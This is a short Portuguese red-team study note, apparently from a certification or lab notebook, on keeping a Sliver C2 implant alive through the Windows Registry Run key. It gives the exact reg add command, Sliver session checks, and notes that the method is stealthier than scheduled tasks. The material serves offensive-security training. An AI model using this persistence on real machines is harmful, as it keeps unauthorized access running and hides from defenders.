> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/pivoting-and-persistence/persistence/registry-run-keys.md).

# Registry Run Keys

**Objetivo**

Executar automaticamente o **implant do Sliver no login do usuário**, garantindo acesso persistente.

**Criar chave no Registry**

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Hacksmarter" /t REG_SZ /d "C:\Users\t.ramsbey\persistence.exe"
```

**Explicação:**

* `HKCU` → HKEY\_CURRENT\_USER (nível usuário)
* `Run` → executa programas no login
* `/v` → nome da chave (Hacksmarter)
* `/t REG_SZ` → tipo string
* `/d` → caminho do payload

**Verificar no Sliver**

```
sessions
sessions -i <new_session_id>
whoami
```

**Características**

* Execução: **no login do usuário**
* Privilégio: **usuário atual**
* Persistência: **dependente de login**

**Vantagens**

* Simples e rápido
* Usa ferramenta nativa (LOLBin)
* Mais discreto que tarefas agendadas

**Desvantagens**

* Não executa no boot
* Depende do usuário fazer login
* Sem elevação de privilégio
